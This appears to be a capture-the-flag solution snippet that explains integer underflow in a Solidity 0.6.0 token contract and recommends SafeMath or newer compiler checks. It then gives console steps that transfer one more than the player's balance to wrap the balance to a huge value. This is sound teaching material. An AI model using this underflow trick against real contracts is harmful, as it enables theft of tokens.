/*

This example explains the damage overflow can cause to a smart contract

The require statement validates the substraction to be positive, but as we have used uint for balances and value, the statement will never be negative and will wrap around once the overflow is reached

This will cause unrealistically high amount of inflow for msg.sender

It is recommended to use safemath library for avoiding the same

-- Note: This is a solidity 0.6.0 example. As of current date, 0.8.0 and higher version have inbuild checks for overflow, so there is no need to use safemath library in current versions

*/

// Get the address of the contract instance from your console
contract.address;

// Get your current balance
balance = contract.balanceOf(player);
// Use this balance to populate command below

// Send a transaction requesting a value more than what you currently hold
contract.transact(contract.address, balance+1);

